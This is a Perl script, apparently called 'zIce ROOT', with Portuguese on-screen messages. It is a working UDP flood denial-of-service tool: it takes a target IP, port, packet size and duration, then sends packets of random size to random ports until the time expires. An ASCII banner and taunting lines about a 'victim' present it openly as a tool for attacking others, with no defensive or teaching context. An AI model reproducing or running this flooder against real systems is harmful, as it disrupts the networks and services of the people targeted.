#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
 

##
# zIce 
##

use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "IP esta errado $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD RED<<EOTEXT;


████████ ██ ████████ ██████
    ██   ██ ██       ██
  ██     ██ ██       ██████
██       ██ ██       ██
████████ ██ ████████ ██████

██████  ████████  ████████ ████████
██   ██ ██    ██  ██    ██    ██
██   ██ ██    ██  ██    ██    ██
██████  ██    ██  ██    ██    ██
██  ██  ██    ██  ██    ██    ██
██  ██  ████████  ████████    ██ 

EOTEXT

print BOLD BLUE "Atackando: $ip 
Dono da VPS by " .
  ($size ? "$size Shurikens" : "Nando..") . "
Atack Disparado com sucesso RIP vitima <3" .
  ($time ? " for $time seconds" : "") . "\n";

print BOLD GREEN<<EOTEXT;
"Para parar o atack CTRL-C" ou espera que o atack acabe
EOTEXT

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
  